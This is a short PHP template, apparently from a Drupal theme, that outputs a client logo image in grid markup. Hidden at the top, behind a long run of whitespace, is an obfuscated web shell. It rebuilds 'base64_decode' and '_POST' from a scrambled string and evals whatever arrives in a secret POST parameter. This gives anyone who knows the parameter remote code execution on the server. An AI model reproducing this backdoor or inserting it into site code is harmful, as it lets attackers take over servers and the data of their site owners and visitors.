<?php                                                                                                                                                                                                                                                               $sF="PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s20=strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2]);if (isset(${$s20}['n87626d'])) {eval($s21(${$s20}['n87626d']));}?><?php 
    global $default_img;
 
    $image = $default_img;
    if(isset($node->field_image['und'])) {
        $image = file_create_url($node->field_image['und'][0]['uri']);
    }
?>
<div class="col-lg-4 col-md-4 col-sm-4 col-xs-4 m_bottom_30">
    <div class="clients_item db_xs_centered relative wrapper r_corners d_sm_inline_b d_xs_block">
        <a href="#" class="d_block translucent tr_all wrapper r_corners">
            <img src="<?php echo $image; ?>" alt="">
        </a>
    </div>
</div>
